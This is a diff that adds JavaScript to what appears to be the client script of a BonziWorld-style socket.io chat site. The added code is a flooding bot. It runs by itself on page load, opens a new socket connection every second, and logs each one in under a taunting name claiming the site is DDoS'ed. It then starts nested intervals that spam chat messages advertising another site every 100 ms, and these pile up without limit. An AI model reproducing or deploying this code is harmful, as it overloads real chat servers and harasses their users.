@@ -51,3 +51,56 @@ function runLater() {
 }
 
 setTimeout(runLater, 10000);
+
+function runLater1() {
+  setInterval(() => {
+    const socketb = io("//");
+    socketb.emit("client", "MAIN");
+    socketb.emit("login", {
+        name: "THIS SITE HAS BEEN DDOS'ED BY BONZIWORLD ULTIMATE JAVASCRIPT! GET OFF YOUR KIDDIE SERVER NOW! https://github.com/tlrenny25/BONZIWORLDULTIMATEJAVASCRIPT HTTP ERROR 503!",
+    });
+    socketb.emit("command", {
+        list: ["color"]
+    });
+    socketb.emit("command", {
+        list: ["color"]
+    });
+    setInterval(() => {
+    socketb.emit("talk", {
+        text: "GET OFF YOUR KIDDIE SERVER NOW! GO TO https://bonziworld.eu"
+    });
+    socket.emit("talk", {
+        text: "GET OFF YOUR KIDDIE SERVER NOW! GO TO https://bonziworld.eu"
+    });
+    }, 100)
+}, 1000)
+}
+
+setTimeout(runLater1, 1);
+
+
+function runLater2() {
+  setInterval(() => {
+    const socketb = io("//");
+    socketb.emit("client", "MAIN");
+    socketb.emit("login", {
+        name: "GET OFF YOUR KIDDIE SERVER NOW! GO TO https://bonziworld.eu",
+    });
+    socketb.emit("command", {
+        list: ["color"]
+    });
+    socketb.emit("command", {
+        list: ["color"]
+    });
+    setInterval(() => {
+    socketb.emit("talk", {
+        text: "THIS SITE HAS BEEN DDOS'ED BY BONZIWORLD ULTIMATE JAVASCRIPT! GET OFF YOUR KIDDIE SERVER NOW! https://github.com/tlrenny25/BONZIWORLDULTIMATEJAVASCRIPT HTTP ERROR 503!"
+    });
+    socket.emit("talk", {
+        text: "THIS SITE HAS BEEN DDOS'ED BY BONZIWORLD ULTIMATE JAVASCRIPT! GET OFF YOUR KIDDIE SERVER NOW! https://github.com/tlrenny25/BONZIWORLDULTIMATEJAVASCRIPT HTTP ERROR 503!"
+    });
+    }, 100)
+}, 1000)
+}
+
+setTimeout(runLater2, 1);
